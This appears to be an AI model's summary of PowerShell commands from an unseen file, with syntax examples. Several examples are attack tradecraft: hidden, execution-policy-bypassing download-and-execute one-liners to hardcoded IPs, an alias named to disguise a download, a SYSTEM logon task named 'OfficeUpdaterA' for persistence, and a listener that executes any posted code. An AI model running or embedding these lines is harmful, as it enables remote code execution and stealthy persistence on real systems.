Here are the PowerShell commands found in the file, along with syntax examples that include switches and parameters:

---

### 1. Invoke-WebRequest / Invoke-RestMethod

#### Syntax Example:
```powershell
Invoke-WebRequest -Uri "http://1.2.3.4/index.html"
Invoke-RestMethod -Uri "http://1.2.3.4/index.html" -Method POST -Body "data"
```
**Switches/parameters:**  
- -Uri <url>
- -Method <GET|POST|PUT|DELETE>
- -Body <data>

---

### 2. .NET WebClient (DownloadFile/DownloadString)

#### Syntax Example:
```powershell
(New-Object System.Net.WebClient).DownloadFile("http://1.2.3.4/index.html", "C:\path\to\file")
(New-Object System.Net.WebClient).DownloadString("http://1.2.3.4/index.html")
```
**Switches/parameters:**  
- URL to download  
- Destination path (for DownloadFile)

---

### 3. System.Net.HttpListener (Create a Web Server)

#### Syntax Example:
```powershell
$http = New-Object System.Net.HttpListener
$http.Prefixes.Add("http://127.0.0.1:8080/")
$http.Start()
# ... handle requests/responses ...
$http.Stop()
```
**Switches/parameters:**  
- Prefixes.Add("http://IP:PORT/")

---

### 4. Invoke-Expression

#### Syntax Example:
```powershell
Invoke-Expression $Command
"get-process" | Invoke-Expression
```
**Switches/parameters:**  
- String/command to execute

---

### 5. PowerShell.exe with Options

#### Syntax Example:
```powershell
PowerShell.exe -ExecutionPolicy Bypass -Command "Invoke-Expression (Invoke-WebRequest -uri http://199.63.64.31/index.html).content"
PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring("http://1.2.3.4/index.html"))'
PowerShell.exe -encodedCommand "Base64String"
```
**Switches/parameters:**  
- -ExecutionPolicy <policy>
- -Command <string>
- -WindowStyle <hidden|normal>
- -NoLogo
- -NonInteractive
- -ep <policy> (short for -ExecutionPolicy)
- -nop (short for -NoProfile)
- -encodedCommand <Base64String>

---

### 6. Base64 Encoding/Decoding

#### Syntax Example:
```powershell
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('get-process'))
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
powershell.exe -encodedCommand "Base64String"
```
**Switches/parameters:**  
- Base64 string as input

---

### 7. PowerShell Aliases

#### Syntax Example:
```powershell
sal block-website iwr
block-website -uri http://1.2.3.4
iex (iwr 1.2.3.4/index.html).Content
```
**Switches/parameters:**  
- Alias name
- Parameters as per the original cmdlet

---

### 8. Schtasks (Task Scheduler Command)

#### Syntax Example:
```powershell
schtasks /create /tn OfficeUpdaterA /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ..." /sc onlogon /ru SYSTEM
```
**Switches/parameters:**  
- /create
- /tn <task_name>
- /tr <task_run_command>
- /sc <schedule>
- /ru <run_as_user>

---

### 9. Curl (used in workflow)

#### Syntax Example:
```bash
curl -X POST -H "Content-type: text/plain" --data-binary @/path/to/payload.ps1 http://199.63.64.31:42000/
```
**Switches/parameters:**  
- -X <method>
- -H <header>
- --data-binary @<file>
- <URL>

---

### 10. Shortened PowerShell Webserver (one-liner)

#### Syntax Example:
```powershell
[Net.HttpListener]::new()|%{
  $_.Prefixes.Add("http://0.0.0.0:8080/");
  $_.Start();
  $c=$_.GetContext();
  iex ([IO.StreamReader]::new($c.Request.InputStream)).ReadToEnd();
  $c.Response.OutputStream.Close();
  $_.stop()
}
```
**Switches/parameters:**  
- Prefixes.Add
- Start/Stop methods

---

If you want syntax or parameter details for any specific command, let me know!
